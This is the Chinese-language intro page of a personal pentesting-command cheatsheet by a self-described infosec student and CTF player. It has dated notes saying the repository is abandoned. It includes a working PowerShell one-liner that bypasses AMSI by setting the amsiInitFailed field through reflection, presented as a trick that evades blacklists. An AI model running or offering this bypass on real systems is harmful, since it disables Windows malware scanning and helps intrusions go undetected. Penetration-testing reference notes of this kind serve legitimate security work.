# Intro

### 为什么会有这个gitbook?

记录一些我总是忘记的命令，要用的时候方便查找，本来都是markdown放在本地的，用起来实在不方便，就想放在网页上，gitbook比较方便。

网上已经有很多大佬写了类似的备忘录，我用起来也很方便，但是还是想自己搞个备忘录，别人的用起来总是感觉怪怪的，不顺手。

大多数备忘录都是漏洞类型based，我的记录方式有所不同，是工具、命令based，主要是拿来当cheatsheet用，不建议作为学习资源从头看到尾。

一开始也是想认真记录，但是有很多临时的感想，若是这本笔记真的有人看的话，看个笑话就可以。

另：也想为社区做一点贡献。

2022.2.21

迁移到本地obsidian了，不再更新。

2022.2.2

发现我的这个笔记变成屎山了，结构完全不合理，决定重构，废弃这个仓库

2022.1.29留

有了一些自己发现的原创有用小技巧，不是网上能找到的，也不是翻译来的，终究还是舍不得放上来，毕竟才学一年多，应该是我敝帚自珍惹，定个小目标，每个小技巧自己爽了半年就公开！

有些过于乱了，得抽时间调整下结构使其更加合理

小技巧之bypassamsi，我这方法没有任何黑名单，理论上永远能用

```powershell
Foreach($b in [Ref].Assembly.GetTypes()) {if ($b.Name -like "?m???????") {foreach($c in $b.GetFields('NonPublic,Static')){if ($c.Name -like "?????????????d"){$c.SetValue($null,$true)}}}}o
```

## whoami?

Just another infosec student && ctf player

blog: [https://blog.northshad0w.com](https://blog.northshad0w.com)

github: [https://github.com/NorthShad0w](https://github.com/NorthShad0w)

## 干活前，先确定客户已经做好了日志和备份，和能管事的人确定！！
